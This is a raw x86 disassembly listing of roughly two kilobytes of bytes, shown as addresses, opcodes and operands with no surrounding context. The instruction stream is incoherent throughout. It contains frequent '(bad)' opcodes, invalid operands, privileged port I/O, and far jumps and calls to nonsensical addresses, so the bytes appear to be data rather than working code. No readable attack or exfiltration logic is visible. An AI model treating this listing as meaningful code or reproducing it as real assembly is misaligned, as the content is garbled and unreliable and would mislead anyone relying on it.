  4042a5:	cmc    
  4042a6:	adc    BYTE PTR [ebx-0x77],dh
  4042a9:	push   sp
  4042ab:	test   DWORD PTR [ecx-0x59],edx
  4042ae:	mov    cl,0x43
  4042b0:	mov    dh,0x19
  4042b2:	pusha  
  4042b3:	cmp    ch,BYTE PTR [edx-0x410103a5]
  4042b9:	sbb    al,0xda
  4042bb:	jae    0x404315
  4042bd:	push   esp
  4042be:	push   ss
  4042bf:	or     eax,eax
  4042c1:	push   ebx
  4042c2:	sahf   
  4042c3:	xor    bl,BYTE PTR [edi]
  4042c5:	cld    
  4042c6:	and    BYTE PTR [ebx+edx*4-0x32b609b],dl
  4042cd:	out    0x41,eax
  4042cf:	push   cs
  4042d0:	pop    ecx
  4042d1:	in     eax,dx
  4042d2:	dec    edi
  4042d3:	push   ebp
  4042d4:	test   al,0x60
  4042d6:	je     0x4042ce
  4042d8:	arpl   sp,bp
  4042da:	(bad)  
  4042db:	sub    al,0xed
  4042dd:	test   al,0xe3
  4042df:	fadd   DWORD PTR [edi]
  4042e1:	push   0x4ce88a41
  4042e6:	pop    ebx
  4042e7:	dec    eax
  4042e8:	popa   
  4042e9:	dec    esp
  4042ea:	dec    esp
  4042eb:	push   edx
  4042ec:	shr    DWORD PTR [ebx-0x5c4a18a7],1
  4042f2:	jl     0x4042f5
  4042f4:	leave  
  4042f5:	cld    
  4042f6:	or     DWORD PTR [esi-0x2574db6d],esp
  4042fc:	xchg   DWORD PTR [edi+0x96693d8],edi
  404302:	mov    ecx,0x6e4a71c6
  404307:	repz xchg esp,eax
  404309:	imul   DWORD PTR [edx+0x533c8998]
  40430f:	jmp    0x633581d7
  404314:	mov    esi,0xc8f8961d
  404319:	sub    al,0x77
  40431b:	sub    ah,BYTE PTR [edi-0x1f]
  40431e:	mov    ebp,0xc9a270a4
  404323:	repnz leave 
  404325:	jno    0x40437a
  404327:	mov    ch,0x10
  404329:	mov    eax,ds:0x1333143b
  40432e:	jg     0x40434e
  404330:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404331:	jge    0x40434c
  404333:	je     0x40437a
  404335:	jge    0x4042d2
  404337:	retf   
  404338:	fdivr  QWORD PTR [esp+ebx*4]
  40433b:	inc    ecx
  40433c:	jo     0x404308
  40433e:	dec    edx
  40433f:	sub    BYTE PTR [ebp-0x185191d1],cl
  404345:	xchg   esp,eax
  404346:	adc    DWORD PTR [esi+0x38904f1],eax
  40434c:	add    bh,BYTE PTR [esi]
  40434e:	ret    0xf7fa
  404351:	aas    
  404352:	in     eax,0xc7
  404354:	adc    eax,0x9cd861c
  404359:	adc    ecx,DWORD PTR [edx-0x78]
  40435c:	(bad)  
  40435d:	leave  
  40435e:	xor    eax,0x1628a255
  404363:	clc    
  404364:	mov    al,ds:0xdc9022e3
  404369:	cmp    al,0x6c
  40436b:	mov    ebp,0x2c3675d7
  404370:	push   ebp
  404371:	adc    ah,dh
  404373:	retf   0xa305
  404376:	out    0xd3,eax
  404378:	repz dec ebp
  40437a:	add    al,0x77
  40437c:	(bad)  
  40437d:	dec    esi
  40437e:	test   ch,dh
  404380:	retf   
  404381:	cdq    
  404382:	loope  0x4043d3
  404384:	push   edi
  404385:	ret    0xec4d
  404388:	jns    0x40436c
  40438a:	int    0xbe
  40438c:	dec    edi
  40438d:	mov    ?,WORD PTR [edi-0x2f4c19b1]
  404393:	int3   
  404394:	mov    esp,0x23c070fc
  404399:	xchg   ebx,eax
  40439a:	stos   BYTE PTR es:[edi],al
  40439b:	sbb    DWORD PTR [edi-0x44ceae20],ebp
  4043a1:	pop    ebp
  4043a2:	inc    esi
  4043a3:	mov    edx,0xb1aff542
  4043a8:	or     BYTE PTR [eax],bl
  4043aa:	push   es
  4043ab:	xor    eax,0x2d4c7519
  4043b0:	jmp    0x4043f1
  4043b2:	fcmovnbe st,st(7)
  4043b4:	fwait
  4043b5:	test   ecx,edi
  4043b7:	rcr    DWORD PTR [ecx],1
  4043b9:	push   edi
  4043ba:	pop    ebx
  4043bb:	loopne 0x404421
  4043bd:	scas   al,BYTE PTR es:[edi]
  4043be:	xchg   ecx,eax
  4043bf:	adc    ch,BYTE PTR [edx-0x1c47e8ce]
  4043c5:	cli    
  4043c6:	cmp    al,0xba
  4043c8:	out    0xd3,al
  4043ca:	mov    ebx,0xc10170f8
  4043cf:	and    al,BYTE PTR ds:0x5641ba75
  4043d5:	and    esi,DWORD PTR [ebx-0x30630825]
  4043db:	es pop edi
  4043dd:	out    dx,al
  4043de:	jle    0x40441a
  4043e0:	sub    esi,esi
  4043e2:	inc    esi
  4043e3:	ror    BYTE PTR [esi-0x5c],1
  4043e6:	mov    edi,0x1054001e
  4043eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4043ec:	push   ds
  4043ed:	pop    ebp
  4043ee:	pop    es
  4043ef:	test   bh,0xc1
  4043f2:	mov    eax,0x6bca718c
  4043f7:	dec    esp
  4043f8:	xchg   ebx,eax
  4043f9:	mov    dl,ch
  4043fb:	fdiv   QWORD PTR ds:0xe902aec9
  404401:	inc    eax
  404402:	daa    
  404403:	ss icebp 
  404405:	gs jo  0x4043cb
  404408:	add    eax,0xcc6c6e35
  40440d:	gs mov dh,0x27
  404410:	outs   dx,DWORD PTR ds:[esi]
  404411:	add    esi,DWORD PTR [ebp-0x55]
  404414:	sbb    bh,cl
  404416:	mov    eax,0xbcaf2f1f
  40441b:	add    ebp,DWORD PTR [ebp-0x2d]
  40441e:	(bad)  
  40441f:	mov    edx,edi
  404421:	ins    DWORD PTR es:[edi],dx
  404422:	jg     0x4043c5
  404424:	mov    DWORD PTR [esi+0x5e261c69],edi
  40442a:	or     al,0x73
  40442c:	jbe    0x4043ef
  40442e:	inc    ebx
  40442f:	jne    0x4043ec
  404431:	shr    DWORD PTR [eax+eiz*8-0x1e2f9362],cl
  404438:	pop    esi
  404439:	aad    0x4
  40443b:	sub    bl,BYTE PTR [ebx+0x15]
  40443e:	pop    ds
  40443f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404440:	lods   eax,DWORD PTR ds:[esi]
  404441:	(bad)  
  404442:	out    0xe3,eax
  404444:	sbb    DWORD PTR [edx+0x29],0x457b00f2
  40444b:	fstp   QWORD PTR [ecx+0x1045c2b]
  404451:	loope  0x4043ff
  404453:	es (bad) 
  404455:	mov    eax,DWORD PTR [edi-0x2c6c7783]
  40445b:	pop    ss
  40445c:	cvtps2pd xmm6,xmm1
  40445f:	xchg   edx,eax
  404460:	test   bl,al
  404462:	out    dx,eax
  404463:	idiv   DWORD PTR [ecx-0x1b60a11d]
  404469:	xchg   ebx,eax
  40446a:	(bad)  
  40446b:	mov    ds:0xa4c719cd,eax
  404470:	sti    
  404471:	mov    dl,0xa1
  404473:	jbe    0x404473
  404475:	loopne 0x404425
  404477:	mov    dl,BYTE PTR [ebp-0x7b752647]
  40447d:	mov    ds:0xaf73709e,eax
  404482:	adc    DWORD PTR [esi+0x5f],ebp
  404485:	xchg   esp,eax
  404486:	fdiv   DWORD PTR [edx]
  404488:	test   BYTE PTR [ecx+0x12],ah
  40448b:	pop    edi
  40448c:	ja     0x404476
  40448e:	inc    ebp
  40448f:	adc    dh,bl
  404491:	in     eax,0xb8
  404493:	fstp   DWORD PTR [eax+0x50d4b91b]
  404499:	ja     0x4044e5
  40449b:	das    
  40449c:	fst    DWORD PTR [edx+0x7e]
  40449f:	add    cl,BYTE PTR [edi+ecx*2-0x19660277]
  4044a6:	mov    al,ds:0x26c496ab
  4044ab:	jl     0x404510
  4044ad:	sahf   
  4044ae:	mov    ebp,0x515975df
  4044b3:	lock mov esi,0x9a01195c
  4044b9:	mov    ds:0x44d19f81,al
  4044be:	push   eax
  4044bf:	stc    
  4044c0:	popa   
  4044c1:	xor    ebp,esi
  4044c3:	fwait
  4044c4:	mov    al,0x40
  4044c6:	add    cl,BYTE PTR [ecx-0x434852b]
  4044cc:	stc    
  4044cd:	ss pusha 
  4044cf:	jl     0x4044f0
  4044d1:	scas   eax,DWORD PTR es:[edi]
  4044d2:	pop    edx
  4044d3:	jnp    0x404458
  4044d5:	pop    ebp
  4044d6:	jp     0x4044c1
  4044d8:	or     BYTE PTR [ebx-0x8],ah
  4044db:	(bad)  
  4044dc:	mov    al,0xea
  4044de:	xchg   edi,eax
  4044df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4044e0:	adc    cl,BYTE PTR [edx]
  4044e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4044e3:	mov    ds:0x819282d6,al
  4044e8:	inc    esi
  4044e9:	int3   
  4044ea:	fidiv  DWORD PTR [ecx-0x29d90565]
  4044f0:	or     al,0x11
  4044f2:	pop    edx
  4044f3:	adc    edx,edi
  4044f5:	outs   dx,DWORD PTR ds:[esi]
  4044f6:	ins    BYTE PTR es:[edi],dx
  4044f7:	mov    DWORD PTR [esi+esi*2],ebx
  4044fa:	or     DWORD PTR [edi],ebp
  4044fc:	add    eax,0xd3d1aae2
  404501:	mov    edx,0x6ab6bb52
  404506:	stos   BYTE PTR es:[edi],al
  404507:	ins    DWORD PTR es:[edi],dx
  404508:	adc    BYTE PTR [eax+0x376b95c],dl
  40450e:	test   DWORD PTR [edx-0x4c],esp
  404511:	popa   
  404512:	dec    ebx
  404513:	push   ss
  404514:	fs or  al,0xf6
  404517:	add    di,WORD PTR [esi-0x354ab7b8]
  40451e:	inc    ax
  404520:	sub    DWORD PTR [eax],eax
  404522:	retf   0x1ce4
  404525:	mov    cl,0x7a
  404527:	stc    
  404528:	or     cl,BYTE PTR [edx]
  40452a:	dec    edi
  40452b:	mov    ?,WORD PTR [esi]
  40452d:	into   
  40452e:	mov    edi,esp
  404530:	(bad)  
  404531:	loope  0x404591
  404533:	ja     0x404518
  404535:	sub    eax,0xa1e27b69
  40453a:	test   ah,cl
  40453c:	cmp    al,0x96
  40453e:	ds cmp eax,0x905aef5a
  404544:	jnp    0x404554
  404546:	in     al,dx
  404547:	shr    dl,cl
  404549:	mov    BYTE PTR [ebx],dh
  40454b:	mov    DWORD PTR [eax],ebp
  40454d:	mov    eax,ds:0xdd466c35
  404552:	pushf  
  404553:	(bad)  
  404554:	mov    dh,0x2
  404556:	sbb    ch,bh
  404558:	or     DWORD PTR [esi+0x27],ecx
  40455b:	sbb    DWORD PTR [eax-0x71],edi
  40455e:	ror    DWORD PTR [ecx],0xba
  404561:	shr    DWORD PTR [ebx+ecx*1],0xe1
  404565:	and    edx,DWORD PTR [ebx+ebx*1-0x1d]
  404569:	(bad)  
  40456a:	outs   dx,DWORD PTR ds:[esi]
  40456b:	mov    ecx,0x2d605bce
  404570:	imul   eax,DWORD PTR [ebp+0x36],0xffffffa5
  404574:	mov    al,BYTE PTR [edx-0xc]
  404577:	popa   
  404578:	pop    es
  404579:	adc    DWORD PTR [edi+0x56],eax
  40457c:	out    0xa0,al
  40457e:	xchg   esi,eax
  40457f:	daa    
  404580:	and    cl,BYTE PTR [edi+0x20]
  404583:	test   al,0x4c
  404585:	test   BYTE PTR [edx+0x1b028a29],dh
  40458b:	add    eax,0xe9682942
  404590:	add    al,0x95
  404592:	test   DWORD PTR [eax],esi
  404594:	adc    ecx,DWORD PTR [edx+eiz*4]
  404597:	idiv   dh
  404599:	pop    ds
  40459a:	mul    BYTE PTR [ebp-0x41]
  40459d:	mov    ecx,0x1db6da60
  4045a2:	retf   
  4045a3:	cwde   
  4045a4:	and    al,0x4d
  4045a6:	jmp    FWORD PTR [ebx-0x27]
  4045a9:	pop    ebp
  4045aa:	lds    ebx,FWORD PTR [edx+0x29]
  4045ad:	push   ax
  4045af:	push   eax
  4045b0:	int3   
  4045b1:	sbb    eax,0xd15c5b2f
  4045b6:	sub    BYTE PTR ds:0x30e69be1,dh
  4045bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4045bd:	or     edx,0x7278d2b
  4045c3:	dec    ecx
  4045c4:	pop    eax
  4045c5:	and    al,0x4e
  4045c7:	jb     0x404553
  4045c9:	dec    ebx
  4045ca:	add    BYTE PTR [edi+0x37],ch
  4045cd:	dec    esi
  4045ce:	pop    ebx
  4045cf:	outs   dx,DWORD PTR ds:[esi]
  4045d0:	push   ss
  4045d1:	ret    0x5ceb
  4045d4:	cdq    
  4045d5:	dec    esi
  4045d6:	iret   
  4045d7:	and    al,0xe5
  4045d9:	jnp    0x4045fa
  4045db:	adc    al,0x90
  4045dd:	clc    
  4045de:	and    eax,0x7c2fb0ed
  4045e3:	xor    ah,ah
  4045e5:	cld    
  4045e6:	ret    
  4045e7:	xchg   edx,eax
  4045e8:	pushf  
  4045e9:	sbb    eax,0x9f0cce0e
  4045ee:	out    dx,eax
  4045ef:	push   eax
  4045f0:	inc    eax
  4045f1:	mov    eax,fs
  4045f3:	jne    0x4045a0
  4045f5:	pop    ecx
  4045f6:	jle    0x404619
  4045f8:	and    ebp,edx
  4045fa:	iret   
  4045fb:	push   ds
  4045fc:	dec    edx
  4045fd:	ds mov cl,0x1b
  404600:	xor    ah,BYTE PTR [eax]
  404602:	lock adc al,BYTE PTR [eax-0x3a]
  404606:	or     al,0x11
  404608:	retf   0x55e
  40460b:	outs   dx,BYTE PTR ds:[esi]
  40460c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40460d:	fdivp  st(6),st
  40460f:	sbb    al,0x48
  404611:	shl    bh,1
  404613:	push   0x3452f41b
  404618:	and    BYTE PTR [edi+0x47],ah
  40461b:	lods   al,BYTE PTR ds:[esi]
  40461c:	imul   ecx,DWORD PTR [ebx+0x64],0x8
  404620:	(bad)  
  404623:	or     edx,DWORD PTR [ebx-0x7]
  404626:	cs push 0x7136d1eb
  40462c:	es cs pop eax
  40462f:	fcmovnbe st,st(7)
  404631:	jmp    0xb0808364
  404636:	and    al,0xc3
  404638:	pop    edx
  404639:	fnstsw WORD PTR [edx+0x59]
  40463c:	add    eax,0x8eca0b2c
  404641:	inc    ecx
  404642:	out    0xb9,al
  404644:	(bad)  
  404645:	jge    0x4046bd
  404647:	ins    BYTE PTR es:[edi],dx
  404648:	in     eax,0x72
  40464a:	xor    edi,DWORD PTR [edi+esi*1+0x16]
  40464e:	je     0x40468e
  404650:	dec    edx
  404651:	dec    esp
  404652:	lock add al,0x6c
  404655:	push   eax
  404656:	aas    
  404657:	(bad)  
  40465a:	jmp    0xbd1c:0xa2904902
  404661:	faddp  st(0),st
  404663:	xor    bl,BYTE PTR [edi+0x49997cce]
  404669:	loop   0x40468d
  40466b:	stos   BYTE PTR es:[edi],al
  40466c:	clc    
  40466d:	jmp    0x69fe:0xe640f627
  404674:	mov    bh,0x4d
  404676:	push   edx
  404677:	cs jecxz 0x404696
  40467a:	dec    ebp
  40467b:	mov    cl,0xbf
  40467d:	and    edx,0xf
  404680:	or     al,BYTE PTR [ebx-0x78678be1]
  404686:	aam    0x6d
  404688:	psllw  mm4,QWORD PTR [esi]
  40468b:	fwait
  40468c:	sub    dl,dl
  40468e:	jp     0x404686
  404690:	fist   DWORD PTR [esi+0x1]
  404693:	mov    edi,0x70b9f3e6
  404698:	bound  ecx,QWORD PTR [eax+0x4888a5a0]
  40469e:	das    
  40469f:	xor    eax,0xddeb10cc
  4046a4:	xchg   edx,eax
  4046a5:	imul   ecx,DWORD PTR [eax],0x9a806cb9
  4046ab:	in     al,dx
  4046ac:	stc    
  4046ad:	xchg   edi,eax
  4046ae:	out    0x9e,eax
  4046b0:	pop    edi
  4046b1:	sub    ebx,edx
  4046b3:	js     0x40467a
  4046b5:	mov    eax,0x4b4f3a16
  4046ba:	push   eax
  4046bb:	sahf   
  4046bc:	pop    es
  4046bd:	mov    edi,0x7f867f48
  4046c2:	mov    esp,0x54d0b67f
  4046c7:	aad    0x78
  4046c9:	stc    
  4046ca:	pop    ebx
  4046cb:	jb     0x4046d8
  4046cd:	cli    
  4046ce:	xchg   esi,eax
  4046cf:	nop
  4046d0:	(bad)  
  4046d1:	dec    DWORD PTR [eax-0x29e08be7]
  4046d7:	icebp  
  4046d8:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4046da:	jo     0x40473e
  4046dc:	in     al,dx
  4046dd:	retf   
  4046de:	repnz sub DWORD PTR [esi-0x52],ebx
  4046e2:	mov    al,0xc
  4046e4:	mov    ebx,0x67052946
  4046e9:	and    esi,DWORD PTR fs:[edx+ecx*1]
  4046ed:	aad    0xe7
  4046ef:	adc    BYTE PTR [edx-0x60e74208],dh
  4046f5:	and    BYTE PTR [ebx-0x4c3c2b62],bh
  4046fb:	sub    ebx,DWORD PTR [ebx+0x52b6b17c]
  404701:	mov    ecx,0xb340946d
  404706:	xor    al,0xd2
  404708:	ins    BYTE PTR es:[edi],dx
  404709:	div    cl
  40470b:	cmp    al,0x35
  40470d:	ins    DWORD PTR es:[edi],dx
  40470e:	inc    ecx
  40470f:	add    al,0x8d
  404711:	test   BYTE PTR [esi+0x3],dh
  404714:	push   ecx
  404715:	mov    al,0x1c
  404717:	pushf  
  404718:	test   al,0xa
  40471a:	pop    ds
  40471b:	add    ah,BYTE PTR [eax]
  40471d:	mov    edi,0x500732b4
  404722:	repnz inc ebx
  404724:	sub    ah,cl
  404726:	mov    bl,0xe9
  404728:	push   edx
  404729:	shr    DWORD PTR [edi-0x1f0a3cf8],cl
  40472f:	hlt    
  404730:	sub    ax,0xb4b7
  404734:	xchg   ebp,eax
  404735:	mov    esp,0xf6bba6f0
  40473a:	xchg   eax,ebx
  40473c:	sub    al,0xf9
  40473e:	sti    
  40473f:	fwait
  404740:	rol    BYTE PTR [ebp+eiz*2-0x80],0x79
  404745:	jae    0x404745
  404747:	pop    edx
  404748:	leave  
  404749:	xchg   ebx,eax
  40474a:	lahf   
  40474b:	dec    ebp
  40474c:	test   BYTE PTR [ecx*2+0x2231f0c8],dl
  404753:	test   al,0xad
  404755:	cmp    DWORD PTR [edi+0x1ffa78e2],eax
  40475b:	gs push ds
  40475d:	push   ss
  40475e:	sub    al,0xaf
  404760:	jno    0x404716
  404762:	mul    BYTE PTR [edx-0x17]
  404765:	or     al,0xf9
  404767:	dec    edi
  404768:	enter  0x289f,0xd
  40476c:	inc    ebp
  40476d:	(bad)  
  40476e:	cmp    BYTE PTR [edi],dh
  404770:	pop    ecx
  404771:	mov    bl,ah
  404773:	jecxz  0x404709
  404775:	fcom   st(6)
  404777:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404778:	fmulp  st(0),st
  40477a:	ds mov dl,0xac
  40477d:	pusha  
  40477e:	and    bl,BYTE PTR [edx]
  404780:	pop    eax
  404781:	sub    al,BYTE PTR [ecx-0xfd94b7d]
  404787:	mov    ah,0x1
  404789:	pushf  
  40478a:	pop    ebp
  40478b:	sbb    al,0x7f
  40478d:	mov    bh,0x2e
  40478f:	adc    dl,dh
  404791:	jnp    0x404781
  404793:	adc    eax,0x703b0058
  404798:	aas    
  404799:	setbe  bl
  40479c:	add    DWORD PTR [ecx-0x6],0xe140e9bf
  4047a3:	je     0x40472b
  4047a5:	data16 test bl,cl
  4047a8:	stc    
  4047a9:	div    DWORD PTR [edx+0x10]
  4047ac:	or     DWORD PTR [ecx+ecx*1],ecx
  4047af:	adc    eax,0x65c1ed8
  4047b4:	add    ch,dl
  4047b6:	add    dh,BYTE PTR [edi-0x7f]
  4047b9:	aad    0x91
  4047bb:	test   DWORD PTR [edi-0x6c5d47e7],eax
  4047c1:	jle    0x404826
  4047c3:	scas   al,BYTE PTR es:[edi]
  4047c4:	lea    esp,[edx+0x5d561756]
  4047ca:	push   edi
  4047cb:	push   ebp
  4047cc:	mov    edi,0xc4873bf4
  4047d1:	mov    eax,0x33306eae
  4047d6:	in     al,dx
  4047d7:	mov    ds:0x65db6b0f,eax
  4047dc:	jl     0x4047dc
  4047de:	int3   
  4047df:	inc    ecx
  4047e0:	push   0x11eda9f2
  4047e5:	sbb    al,0x68
  4047e7:	and    ch,dh
  4047e9:	jg     0x40478e
  4047eb:	push   cs
  4047ec:	(bad)  
  4047ed:	mov    ebp,0x3c645446
  4047f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4047f3:	and    esp,esi
  4047f5:	int    0x2c
  4047f7:	xor    BYTE PTR [eax+0x6d],al
  4047fa:	add    dl,BYTE PTR [ebp+0x32]
  4047fd:	xchg   edi,eax
  4047fe:	jmp    0x9d66ccaf
  404803:	pop    ecx
  404804:	add    al,0x95
  404806:	out    0x10,al
  404808:	icebp  
  404809:	jecxz  0x4047a7
  40480b:	mov    dh,0x24
  40480e:	outs   dx,BYTE PTR ds:[esi]
  40480f:	jne    0x4047ae
  404811:	in     al,0x64
  404813:	div    DWORD PTR [eax+0x63]
  404816:	jns    0x404803
  404818:	clc    
  404819:	cmc    
  40481a:	push   ss
  40481b:	imul   ebp,DWORD PTR [ebp+0x6a81a840],0xb13c5e1e
  404825:	and    al,0xa7
  404827:	int    0x62
  404829:	ror    ebx,cl
  40482b:	mov    edx,0x3a51880
  404830:	mov    BYTE PTR [ebp+ebp*2-0x58],dl
  404834:	sbb    al,0xc8
  404836:	fs (bad) 
  404838:	pop    ebx
  404839:	ds ret 
  40483b:	out    dx,eax
  40483c:	out    0xac,al
  40483e:	psrld  mm0,QWORD PTR [ebx]
  404841:	xchg   esi,eax
  404842:	push   0xffffffc4
  404844:	pop    ebp
  404845:	cmp    al,0xfc
  404847:	(bad)
  40484a:	mov    ecx,DWORD PTR [eax-0x1e]
  40484d:	add    BYTE PTR [eax],dl
  40484f:	stos   BYTE PTR es:[edi],al
  404850:	lea    eax,[ecx-0x695dd62b]
  404856:	je     0x4048bc
  404858:	nop
  404859:	cli    
  40485a:	mov    bl,0xa7
  40485c:	mov    dl,0xc1
  40485e:	add    BYTE PTR [eax+0x77788701],al
  404864:	dec    ebp
  404865:	inc    edi
  404866:	rol    DWORD PTR [edx],1
  404868:	jo     0x4047f1
  40486a:	fcom   DWORD PTR [ebp+0x43ac8126]
  404870:	lock xchg esi,eax
  404872:	inc    ecx
  404873:	mov    esi,0xd1deca9f
  404878:	nop
  404879:	mov    bl,0x44
  40487b:	xor    edx,DWORD PTR [eax+0x59f49ad7]
  404881:	xor    al,0xc0
  404883:	pusha  
  404884:	pushf  
  404885:	int3   
  404886:	sbb    ebp,DWORD PTR [ebp-0x6a]
  404889:	mov    eax,DWORD PTR [edx-0x43]
  40488c:	cmp    ah,BYTE PTR [ebx+0x7e]
  40488f:	repz pop ss
  404891:	or     BYTE PTR [ebx-0x6c],bl
  404894:	jne    0x40490c
  404896:	mov    esi,0xf0b4607f
  40489b:	rcr    edi,0xdf
  40489e:	mov    dh,0x97
  4048a0:	xchg   dl,dl
  4048a2:	repnz (bad) [edi-0x411e6d88]
  4048a9:	cmp    BYTE PTR [ebx+0x42e266d1],0x40
  4048b0:	and    dh,BYTE PTR [ebp-0x70]
  4048b3:	rol    ebx,cl
  4048b5:	fdivp  st(4),st
  4048b7:	test   BYTE PTR [edi],ah
  4048b9:	mov    dl,0xe3
  4048bb:	sbb    DWORD PTR [esi],ecx
  4048bd:	jl     0x40486a
  4048bf:	repz xor al,0x7d
  4048c2:	sahf   
  4048c3:	sbb    edx,DWORD PTR [eax-0x33]
  4048c6:	jmp    0x40485f
  4048c8:	xor    ecx,DWORD PTR [edx+eiz*1+0x7f]
  4048cc:	add    DWORD PTR [ecx-0x2fbc87ea],eax
  4048d2:	daa    
  4048d3:	cwde   
  4048d4:	push   cs
  4048d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4048d6:	addr16 sub al,0x7b
  4048d9:	inc    ecx
  4048da:	jecxz  0x4048d6
  4048dc:	fxch   st(1)
  4048de:	pusha  
  4048df:	sub    esi,0x43e61c46
  4048e5:	stos   BYTE PTR es:[edi],al
  4048e6:	mov    WORD PTR [ebx+0x68209224],gs
  4048ec:	pop    eax
  4048ed:	lods   eax,DWORD PTR ds:[esi]
  4048ee:	sbb    al,0x14
  4048f0:	dec    eax
  4048f1:	ins    BYTE PTR es:[edi],dx
  4048f2:	jp     0x404956
  4048f4:	and    DWORD PTR ds:0xf8dc41ca,0x76036539
  4048fe:	or     DWORD PTR [ecx-0x4307e9a8],edi
  404904:	ss jno 0x40496d
  404907:	fst    QWORD PTR [ebp-0x31]
  40490a:	cmp    eax,0x1559ed8b
  40490f:	aas    
  404910:	cmp    al,0x4b
  404912:	mov    gs,edi
  404914:	test   eax,0xfa0bd49c
  404919:	outs   dx,DWORD PTR ds:[esi]
  40491a:	cmp    dl,BYTE PTR [ebx]
  40491c:	jmp    0x404960
  40491e:	inc    edi
  40491f:	mov    edx,0xf2797cea
  404924:	jg     0x40494e
  404926:	cwde   
  404927:	push   ss
  404928:	inc    edi
  404929:	ja     0x4048e1
  40492b:	rol    BYTE PTR [edi+0xb],1
  40492e:	rcl    BYTE PTR [edi+ecx*4-0x1c],cl
  404932:	dec    esi
  404933:	hlt    
  404934:	and    ecx,eax
  404936:	int    0x6b
  404938:	loopne 0x404942
  40493a:	out    dx,eax
  40493b:	jnp    0x4048fc
  40493d:	jecxz  0x404974
  40493f:	call   0x6d79:0x8b567844
  404946:	(bad)  [eax]
  404948:	into   
  404949:	adc    al,0xfc
  40494b:	gs (bad) 
  40494d:	sahf   
  40494e:	leave  
  40494f:	fwait
  404950:	es mov eax,0xcbb02bfa
  404956:	gs add al,0xdb
  404959:	pusha  
  40495a:	ret    
  40495b:	lds    edi,FWORD PTR [ebp-0x6b]
  40495e:	or     eax,0x7baf94b4
  404963:	sahf   
  404964:	jp     0x404934
  404966:	aad    0x5b
  404968:	inc    ebp
  404969:	mov    al,0xc0
  40496b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40496c:	cmp    BYTE PTR ds:0x6e135356,cl
  404972:	retf   
  404973:	mov    eax,0x23880979
  404978:	mov    eax,ds:0x13e20965
  40497d:	sbb    ch,bh
  40497f:	push   es
  404980:	fdivr  QWORD PTR [esi+0x2a]
  404983:	jne    0x404934
  404985:	arpl   WORD PTR [esi+0x6eee75c2],bx
  40498b:	push   ebp
  40498c:	shl    BYTE PTR [eax],1
  40498e:	mov    eax,0x49344a41
  404993:	aas    
  404994:	and    bh,BYTE PTR [ebp+0x7df1ef29]
  40499a:	mov    eax,ds:0xd239395d
  40499f:	pop    ecx
  4049a0:	sub    DWORD PTR [ecx+0x48],edi
  4049a3:	adc    BYTE PTR [edi-0x26f7bdac],dh
  4049a9:	shr    DWORD PTR [ebx],cl
  4049ab:	sbb    BYTE PTR [edi+0x62ca73b6],cl
  4049b1:	fcomi  st,st(0)
  4049b3:	shl    BYTE PTR [ecx+edx*8],1
  4049b6:	add    esp,DWORD PTR [esi]
  4049b8:	clc    
  4049b9:	mov    bl,0x9d
  4049bb:	aam    0x46
  4049bd:	pop    ss
  4049be:	or     bl,BYTE PTR [edi+0x28]
  4049c1:	jo     0x4049a6
  4049c3:	add    eax,0x8e8dac8d
  4049c8:	ret    0x902e
  4049cb:	daa    
  4049cc:	jnp    0x404a4c
  4049ce:	rol    BYTE PTR [edx-0x73],1
  4049d1:	xchg   edx,eax
  4049d2:	mov    ebp,0xb5266b00
  4049d7:	es out 0x5d,eax
  4049da:	rcl    ch,1
  4049dc:	jge    0x4049c6
  4049de:	in     eax,0x4c
  4049e0:	(bad)  
  4049e1:	cs xchg esp,eax
  4049e3:	mov    edx,0xa962c1f9
  4049e8:	es mov ah,0x85
  4049eb:	test   al,0x2b
  4049ed:	mov    esi,0x9d2fdf98
  4049f2:	sbb    BYTE PTR gs:[esi+0x4519e32a],cl
  4049f9:	icebp  
  4049fa:	adc    eax,DWORD PTR [ecx+edx*8-0x1e]
  4049fe:	lds    eax,FWORD PTR [ecx+0x75]
  404a01:	ret    
  404a02:	repz sub al,0x5a
  404a05:	jbe    0x4049bf
  404a07:	ret    0xf686
  404a0a:	(bad)  
  404a0b:	jne    0x4049d8
  404a0d:	jno    0x404a07
  404a0f:	mov    al,0x1e
  404a11:	or     eax,0x38d610a
  404a16:	(bad)  
  404a17:	fstp   TBYTE PTR [esi+0xd]
  404a1a:	sub    eax,0x6e15e464
  404a1f:	int    0x3c
  404a21:	pop    ds
  404a22:	inc    ebx
  404a23:	cmp    eax,0x5bf5f13f
  404a28:	mov    ebx,0x8b794cf2
  404a2d:	jl     0x4049fc
  404a2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a30:	nop
  404a31:	sub    DWORD PTR [esi],ebx
  404a33:	mov    esi,0x361e0723
  404a38:	stos   BYTE PTR es:[edi],al
  404a39:	sbb    bl,BYTE PTR ds:0xdefe847e
  404a3f:	mov    eax,0xb2d65877
  404a44:	xchg   ebp,eax
  404a45:	xchg   BYTE PTR [ecx],al
  404a47:	dec    edx
  404a48:	imul   bl
  404a4a:	and    eax,DWORD PTR [eax-0x4a6826ec]
  404a50:	and    BYTE PTR [esi+ecx*8-0x12794134],dl
  404a57:	jge    0x404a5f
  404a59:	arpl   WORD PTR [edx],bp
  404a5b:	mov    al,0xd7
  404a5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404a5e:	js     0x404a33
  404a60:	scas   al,BYTE PTR es:[edi]
  404a61:	pop    ds
  404a62:	xchg   edi,eax
  404a63:	xchg   ebp,eax
  404a64:	fwait
  404a65:	jne    0x404a25
  404a67:	or     DWORD PTR [eax-0x4c4d36fe],edi
  404a6d:	stos   BYTE PTR es:[edi],al
  404a6e:	aas    
  404a6f:	leave  
  404a70:	scas   al,BYTE PTR es:[edi]
  404a71:	ret    
  404a72:	rcr    ch,cl
  404a74:	test   dl,dh
  404a76:	call   0xa66:0xd6c10f3e
  404a7d:	nop
  404a7e:	shl    BYTE PTR [ebx],0x8c
